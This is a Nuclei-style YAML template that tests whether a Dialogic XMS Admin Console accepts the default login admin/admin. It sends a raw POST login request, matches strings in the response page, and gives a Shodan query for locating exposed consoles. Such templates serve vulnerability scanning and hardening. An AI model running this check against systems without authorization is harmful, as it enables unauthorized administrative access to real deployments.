id: dialogic-xms-default-login

info:
  name: Dialogic XMS Admin Console - Default Login
  author: ritikchaddha
  severity: high
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Dialogic XMS Admin Console"
  tags: dialogic,admin,default-login,misconfig

http:
  - raw:
      - |
        POST /index.php/verifyLogin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        usernameId={{username}}&passwordId={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'DialogicDojo'
          - 'userId">user:'
          - 'var downloads'
          - 'onclick="logout'
        condition: and

      - type: status
        status:
          - 200
